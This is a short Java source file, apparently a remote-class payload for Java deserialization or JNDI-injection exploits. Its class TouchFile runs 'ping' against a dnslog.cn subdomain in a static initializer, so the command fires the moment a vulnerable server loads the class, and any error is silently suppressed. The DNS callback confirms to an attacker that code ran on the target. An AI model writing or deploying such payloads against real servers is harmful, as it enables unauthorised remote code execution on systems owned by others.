import java.lang.Runtime;
import java.lang.Process;

public class TouchFile {
	static {
		try {
			Runtime rt = Runtime.getRuntime();
			String[] commands = {"ping", "kisgpp.dnslog.cn"};
			Process pc = rt.exec(commands);
			pc.waitFor();
		} catch (Exception e) {
 			// do nothing
 		}
 	}
}
